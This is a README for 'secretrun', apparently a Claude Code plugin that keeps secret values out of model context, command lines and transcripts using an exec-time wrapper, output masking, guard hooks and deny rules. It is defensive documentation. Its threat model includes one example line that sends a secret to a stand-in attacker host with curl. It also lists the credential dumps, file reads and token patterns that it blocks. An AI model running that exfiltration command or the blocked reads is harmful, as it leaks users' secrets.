# secretrun

**Keep secret _values_ out of Claude Code.** The model handles secret _names_;
the `secretrun` wrapper resolves `name → value` inside its own process, injects
the value into a child command's environment (or stdin), and masks every
occurrence of the value out of the child's output. Nothing lands in `argv`, in
the model's context, or in the Claude Code transcript.

> Built after CrowdStrike flagged plaintext secret values in the command lines of
> processes Claude Code had spawned. This plugin closes those channels.

---

## The leak channels (and how secretrun closes each)

| Channel | How values leak | secretrun's answer |
|---|---|---|
| **argv** | `curl -H "Bearer sk-…"` is visible to EDR, `ps`, and the model | The model writes `secretrun NAME -- curl …`; only the NAME is in argv. Verified: `ps -axww` during a run shows no value. |
| **Context / transcript** | Anything the model reads (`.env`, `echo $KEY`, API errors) persists in plaintext in `~/.claude/projects/*.jsonl` | The value never enters the model's turn: the wrapper resolves it, and masks it out of child output. A guard hook blocks the fishing commands. |
| **Env inheritance** | Bash/hooks/plugins/MCP all inherit `claude`'s env; one `printenv` dumps everything | Values are never placed in `claude`'s env — only in the short-lived child. `printenv`/`env` dumps are denied. |
| **Cross-session** | env/settings/transcripts persist across sessions | No secret is ever written to any of those. Storage is Keychain / cloud SM only. |

---

## How it works (S1 + S2)

**S1 — exec-time injection wrapper + hook guardrails.** `secretrun NAME -- cmd`
resolves the secret, runs `cmd` with the value present only in the child's
environment, and streams the child's merged output through a masker that rewrites
each value (and its base64 / URL-encoded / JSON-escaped forms) to `[REDACTED:NAME]`.
Three hooks back it up:

- **`secret_guard.py`** (PreToolUse · Bash) denies keychain dumps, direct
  `security … -w` reads, reads of `~/.claude/projects/**`, `env`/`printenv`
  dumps, and any attempt to put a value on the `secretrun add` command line.
- **`redact_output.py`** (PostToolUse) scrubs credential-_shaped_ strings
  (`sk-`, `ghp_`, `AKIA…`, JWT, PEM, keyword-adjacent tokens, …) that arrive via
  channels the wrapper never saw — an API error body, a config file, a webpage.
  It never reads real stored values.
- **`session_env.sh`** (SessionStart) puts `secretrun` on `PATH`.

**S2 — native hardening.** Plugins cannot ship permission rules, so
`/secretrun:harden` merges them into your `settings.json`: `permissions.deny` for
`.env*`, `~/.aws`, `~/.ssh`, `~/.config/gcloud`, `~/.claude/projects`;
`CLAUDE_CODE_SUBPROCESS_ENV_SCRUB=1`; and `cleanupPeriodDays: 7`. Zero ceremony,
and it pairs with S1.

### Why not a broker? (S3, considered and rejected)

An MCP "secret broker" server was considered and **rejected** for this threat
model. It adds ceremony per use case (every tool needs a broker-aware call path),
and — critically — the broker process would itself see plaintext values, so it
buys little over a single hardened wrapper while adding a long-lived process and a
new dependency. A short-lived, stdlib-only, single-file wrapper is a smaller and
more auditable trust boundary.

---

## Threat model — what it does and does not stop

**Stops:** secret values in argv, in model context, in the transcript, and in
`claude`'s inheritable env; accidental reads of secret files; credential-shaped
strings surfacing in tool output.

**Explicitly does _not_ stop (be honest):**

- **Deliberate exfiltration by the child.** `secretrun NAME -- curl evil.com?t=$NAME`
  sends the real value over the network — masking covers _output_, not egress.
  The guard cannot reliably distinguish this from legitimate use; network egress
  is the domain of a sandbox network allowlist and your own review.
- **Same-user `ps -Eww` reading the child's env.** Any process you own can read
  your processes' environments. Use `--stdin NAME` for tools that accept the
  secret on stdin (`gh auth login --with-token`, `docker login --password-stdin`)
  to keep it out of the child env entirely.
- **Perfect in-memory zeroization.** CPython cannot guarantee it (see
  `docs/VALIDATION.md`). The primary controls are the wrapper's very short
  lifetime, disabled core dumps, and a traceback-scrubbing excepthook.
- **Keychain audit trail.** macOS Keychain has limited per-access auditing; cloud
  backends (AWS/GCP) provide IAM + access logs.

The redactor complements — it does not replace — a real DLP/EDR layer (e.g. the
sibling `edr` plugin).

---

## Using secretrun from a Claude project

1. **Once per machine.** Add the marketplace and install:
   ```
   /plugin marketplace add lalec/agent-plugins
   /plugin install secretrun@agent-plugins
   ```
   Enable at **user scope** so the hooks + skill cover all projects (opt a project
   out via its `enabledPlugins`).
2. **Once per scope.** Harden native settings: `/secretrun:harden --global`
   (or `--project`). Applies to **new** sessions.
3. **Per project (optional).** Commit a `.secretrun.json` declaring the secret
   names the project needs (values are never in it):
   ```json
   { "secrets": {
       "OPENAI_API_KEY": { "backend": "keychain" },
       "PROD_DB_URL":    { "backend": "aws", "id": "prod/db/url" }
   } }
   ```
   Run `/secretrun:doctor` to verify every entry resolves.
4. **Storing secrets.** You (not the model) type it in your terminal:
   ```
   ! secretrun add OPENAI_API_KEY
   ```
   The value is entered at a hidden prompt; Claude never sees it. Teammates clone
   the repo, install the plugin, and `add` their own copy of each named secret.
5. **Daily use.** Nothing — the `using-secrets` skill auto-triggers and Claude runs
   `secretrun NAME -- cmd`.

### CLI

```
secretrun NAME [NAME...] [-b BACKEND] [--stdin NAME] -- cmd args...
secretrun add NAME [-b BACKEND]     # interactive, hidden prompt (TTY only)
secretrun ls  [-b BACKEND]          # list stored names (never values)
secretrun rm  NAME [-b BACKEND]
secretrun check                     # verify .secretrun.json entries resolve
secretrun-admin doctor | harden --project|--global
```

Backends: `keychain` (default, macOS `security`), `aws` (Secrets Manager),
`gcp` (Secret Manager). Pluggable via the resolver map in `bin/secretrun`.

### At-rest access control

Keychain items are stored under a dedicated service, `secretrun`. By default the
`security` tool is trusted for convenience (no prompt per access). For a
high-value item you can require a prompt on every access by adding it with an
empty trusted-app list:

```
security add-generic-password -s secretrun -a NAME -T "" -w   # then enter value
```

### Optional: sandbox (S2, manual)

For stronger isolation you can add a `sandbox` block to `settings.json` (review
first — it can break tools that need network or broad filesystem access):

```json
{ "sandbox": {
    "network": { "allowUnixSockets": true, "allow": [{ "host": "api.openai.com" }] },
    "denyRead": ["**/.env*", "~/.aws/**", "~/.ssh/**"]
} }
```

See `docs/VALIDATION.md` for the doc references and best-practice mapping.

## Alternatives to the built-in backends

- **1Password:** `op` is not a bundled backend; use `op run -- secretrun-style`
  injection or `op read` inside a `secretrun` child.
- **Other vaults:** add a resolver to the `RESOLVERS` map in `bin/secretrun`
  (one function, `name → bytearray`).
